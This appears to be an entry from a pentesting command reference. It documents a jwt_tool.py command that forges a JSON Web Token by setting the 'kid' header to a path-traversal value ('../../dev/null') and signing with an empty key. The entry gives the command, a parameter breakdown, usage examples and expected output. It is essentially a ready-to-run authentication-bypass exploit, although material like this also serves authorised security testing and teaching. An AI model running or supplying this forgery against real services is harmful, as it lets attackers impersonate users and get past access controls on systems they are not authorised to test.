---
type: command
executor: bash
data: python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
tags:
  - jwt
  - token-modification
platforms:
  - Linux
verified: true
validated: true
---

# modify-jwt-kid-to-dev-null-with-jwt-tool

## Command

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

## Description

This command uses jwt_tool.py to modify an existing JWT's 'kid' header to reference /dev/null via path traversal, signing with an empty key for predictable forgery.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| <JWT> | Base64-encoded JWT token | Yes |
| -I | Inspect and modify mode | Yes |
| -hc kid | Change header claim 'kid' | Yes |
| -hv "../../dev/null" | Set 'kid' value to traverse to /dev/null | Yes |
| -S hs256 | Set signing algorithm to HS256 | Yes |
| -p "" | Provide empty key/password | Yes |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### Advanced Usage

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../dev/null" -S hs256 -p "" -o modified_jwt.txt
```

## Expected Output

Modified JWT output, e.g., 'Header modified successfully. New JWT: eyJ...new_signature' with updated 'kid': "../../dev/null".

## Related

- [[procedures/JWT-Key-ID-kid-Claim-Misuse]]
